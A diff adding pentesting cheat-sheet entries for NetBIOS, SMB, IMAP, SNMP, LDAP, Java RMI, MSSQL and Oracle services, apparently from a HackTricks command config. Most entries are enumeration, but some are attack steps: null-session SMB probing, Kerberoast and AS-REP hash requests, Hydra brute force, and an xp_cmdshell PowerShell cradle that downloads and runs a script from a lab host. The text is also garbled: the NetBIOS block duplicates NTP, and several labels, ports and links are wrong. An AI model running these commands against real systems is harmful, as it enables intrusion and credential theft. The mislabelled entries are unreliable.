@@ -395,7 +395,7 @@ Entry_3:
   Command: nmap -sSUC -p 111 {IP}
 ```
 
-### 113 Ident
+## 113 Ident
 ```
 Protocol_Name: Ident    #Protocol Abbreviation if there is one.
 Port_Number:  113     #Comma separated if there is more than one.
@@ -415,7 +415,7 @@ Entry_2:
   Note: apt install ident-user-enum    ident-user-enum {IP} 22 23 139 445 (try all open ports)
 ```
 
-### 123 NTP
+## 123 NTP
 ```
 Protocol_Name: NTP    #Protocol Abbreviation if there is one.
 Port_Number:  123     #Comma separated if there is more than one.
@@ -434,4 +434,301 @@ Entry_2:
   Description: Enumerate NTP
   Command: nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 {IP}
 ```
+
+## 137,138,139 NetBIOS
+```
+Protocol_Name: NTP    #Protocol Abbreviation if there is one.
+Port_Number:  123     #Comma separated if there is more than one.
+Protocol_Description: Network Time Protocol         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for NTP
+  Note: |
+    The Network Time Protocol (NTP) ensures computers and network devices across variable-latency networks sync their clocks accurately. It's vital for maintaining precise timekeeping in IT operations, security, and logging. NTP's accuracy is essential, but it also poses security risks if not properly managed.
+
+    https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ntp.html
+
+Entry_2:
+  Name: Nmap
+  Description: Enumerate NTP
+  Command: nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 {IP}
+```
+
+## 139,445 SMB
+```
+Protocol_Name: SMB    #Protocol Abbreviation if there is one.
+Port_Number:  137,138,139     #Comma separated if there is more than one.
+Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for SMB
+  Note: |
+    While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
+
+    #These are the commands I run in order every time I see an open SMB port
+
+    With No Creds
+    nbtscan {IP}
+    smbmap -H {IP}
+    smbmap -H {IP} -u null -p null
+    smbmap -H {IP} -u guest
+    smbclient -N -L //{IP}
+    smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
+    rpcclient {IP}
+    rpcclient -U "" {IP}
+    crackmapexec smb {IP}
+    crackmapexec smb {IP} --pass-pol -u "" -p ""
+    crackmapexec smb {IP} --pass-pol -u "guest" -p ""
+    GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
+    GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
+    GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
+    getArch.py -target {IP}
+
+    With Creds
+    smbmap -H {IP} -u {Username} -p {Password}
+    smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
+    smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
+    crackmapexec smb {IP} -u {Username} -p {Password} --shares
+    GetADUsers.py {Domain_Name}/{Username}:{Password} -all
+    GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
+    GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request
+
+    https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html
+
+Entry_2:
+  Name: Enum4Linux
+  Description: General SMB Scan
+  Command: enum4linux -a {IP}
+
+Entry_3:
+  Name: Nmap SMB Scan 1
+  Description: SMB Vuln Scan With Nmap
+  Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}
+
+Entry_4:
+  Name: Nmap Smb Scan 2
+  Description: SMB Vuln Scan With Nmap (Less Specific)
+  Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}
+
+Entry_5:
+  Name: Hydra Brute Force
+  Description: Need User
+  Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb
+
+Entry_6:
+  Name: SMB/SMB2 139/445 consolesless mfs enumeration
+  Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
+  Note: sourced from https://github.com/carlospolop/legion
+  Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'
+```
+
+## 143,993 IMAP
+```
+Protocol_Name: IMAP    #Protocol Abbreviation if there is one.
+Port_Number:  143,993     #Comma separated if there is more than one.
+Protocol_Description: Internet Message Access Protocol         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for WHOIS
+  Note: |
+    The Internet Message Access Protocol (IMAP) is designed for the purpose of enabling users to access their email messages from any location, primarily through an Internet connection. In essence, emails are retained on a server rather than being downloaded and stored on an individual's personal device. This means that when an email is accessed or read, it is done directly from the server. This capability allows for the convenience of checking emails from multiple devices, ensuring that no messages are missed regardless of the device used.
+
+    https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-imap.html
+
+Entry_2:
+  Name: Banner Grab
+  Description: Banner Grab 143
+  Command: nc -nv {IP} 143
+
+Entry_3:
+  Name: Secure Banner Grab
+  Description: Banner Grab 993
+  Command: openssl s_client -connect {IP}:993 -quiet
+
+Entry_4:
+  Name: consolesless mfs enumeration
+  Description: IMAP enumeration without the need to run msfconsole
+  Note: sourced from https://github.com/carlospolop/legion
+  Command: msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS {IP}; set RPORT 143; run; exit'
+```
+
+## 161,162,10161,10162 SNMP
+```
+Protocol_Name: SNMP    #Protocol Abbreviation if there is one.
+Port_Number:  161     #Comma separated if there is more than one.
+Protocol_Description: Simple Network Managment Protocol         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for SNMP
+  Note: |
+    SNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).
+
+    https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html
+
+Entry_2:
+  Name: SNMP Check
+  Description: Enumerate SNMP
+  Command: snmp-check {IP}
+
+Entry_3:
+  Name: OneSixtyOne
+  Description: Crack SNMP passwords
+  Command: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100
+
+Entry_4:
+  Name: Nmap
+  Description: Nmap snmp (no brute)
+  Command: nmap --script "snmp* and not snmp-brute" {IP}
+
+Entry_5:
+  Name: Hydra Brute Force
+  Description: Need Nothing
+  Command: hydra -P {Big_Passwordlist} -v {IP} snmp
+```
+
+## 389,636,3268,3269 LDAP
+```
+Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
+Port_Number:  389,636     #Comma separated if there is more than one.
+Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for LDAP
+  Note: |
+    The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.
+
+    https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html
+
+Entry_2:
+  Name: Banner Grab
+  Description: Grab LDAP Banner
+  Command: nmap -p 389 --script ldap-search -Pn {IP}
+
+Entry_3:
+  Name: LdapSearch
+  Description: Base LdapSearch
+  Command: ldapsearch -H ldap://{IP} -x
+
+Entry_4:
+  Name: LdapSearch Naming Context Dump
+  Description: Attempt to get LDAP Naming Context
+  Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts
+
+Entry_5:
+  Name: LdapSearch Big Dump
+  Description: Need Naming Context to do big dump
+  Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"
+
+Entry_6:
+  Name: Hydra Brute Force
+  Description: Need User
+  Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
+
+Entry_7:
+    Name: Netexec LDAP BloodHound
+    Command: nxc ldap <IP> -u <USERNAME> -p <PASSWORD> --bloodhound -c All -d <DOMAIN.LOCAL> --dns-server <IP> --dns-tcp
+```
+
+## 1098,1099,1050 Java RMI
+```
+Protocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.
+Port_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.
+Protocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Enumeration
+  Description: Perform basic enumeration of an RMI service
+  Command: rmg enum {IP} {PORT}
+```
+
+## 1433 MSSQL Microsoft SQL Server
+```
+Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
+Port_Number:  1433     #Comma separated if there is more than one.
+Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for MSSQL
+  Note: |
+    Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
+
+    #sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
+
+    ###the goal is to get xp_cmdshell working###
+    1. try and see if it works
+        xp_cmdshell `whoami`
+        go
+
+    2. try to turn component back on
+        EXEC SP_CONFIGURE 'xp_cmdshell' , 1
+        reconfigure
+        go
+        xp_cmdshell `whoami`
+        go
+
+    3. 'advanced' turn it back on
+        EXEC SP_CONFIGURE 'show advanced options', 1
+        reconfigure
+        go
+        EXEC SP_CONFIGURE 'xp_cmdshell' , 1
+        reconfigure
+        go
+        xp_cmdshell 'whoami'
+        go
+
+
+
+
+    xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"
+
+
+    https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html
+
+Entry_2:
+  Name: Nmap for SQL
+  Description: Nmap with SQL Scripts
+  Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}
+
+Entry_3:
+  Name: MSSQL consolesless mfs enumeration
+  Description: MSSQL enumeration without the need to run msfconsole
+  Note: sourced from https://github.com/carlospolop/legion
+  Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'
+```
+
+## 1521,1522,1529 Oracle TNS Listener 
+```
+Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
+Port_Number:  1521     #Comma separated if there is more than one.
+Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for Oracle
+  Note: |
+    Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation
+
+    #great oracle enumeration tool
+    navigate to https://github.com/quentinhardy/odat/releases/
+    download the latest
+    tar -xvf odat-linux-libc2.12-x86_64.tar.gz
+    cd odat-libc2.12-x86_64/
+    ./odat-libc2.12-x86_64 all -s 10.10.10.82
+
+    for more details check https://github.com/quentinhardy/odat/wiki
+
+    https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html
+
+Entry_2:
+  Name: Nmap
+  Description: Nmap with Oracle Scripts
+  Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
+```
+
 
